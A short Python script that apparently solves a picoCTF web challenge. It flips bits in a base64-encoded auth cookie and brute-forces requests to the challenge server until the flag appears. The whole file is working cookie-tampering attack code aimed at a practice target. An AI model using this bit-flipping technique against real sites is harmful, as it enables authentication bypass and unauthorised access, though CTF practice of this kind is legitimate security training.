from base64 import b64decode
from base64 import b64encode
import requests

def bitFlip(pos, bit, en_string):
    string = b64decode(en_string.encode()).decode()
    list1 = list(string)
    list1[pos] = chr(ord(list1[pos]) ^ bit)
    ans = "".join(list1)
    return b64encode(ans.encode()).decode()

en_cookie = "VVAwNWVJTUlzdEdkUnd0ZkRxbXZ1MDA1TTd3dmo2ejFuTWZUSTV0QzA2VFBjdXF3eG0xYmRiZm91TGpQamtScVdHRjlVTm5CcVlKUUowaFUydmJVZFRXZUYwcVdOOXVFSW5UV1RZNzgvaTlhQ1liaVdBRUFwY09MNWVRWUNra3E="

r = requests.Session()
url = 'http://mercury.picoctf.net:10868/'

for i in range(128):
    for j in range(128):
        new = bitFlip(i, j, en_cookie)
        cookie = {'auth_name': new}
        d = requests.get('http://mercury.picoctf.net:10868/', cookies = cookie)
        if "pico" in d.text:
            print(d.text)
            break
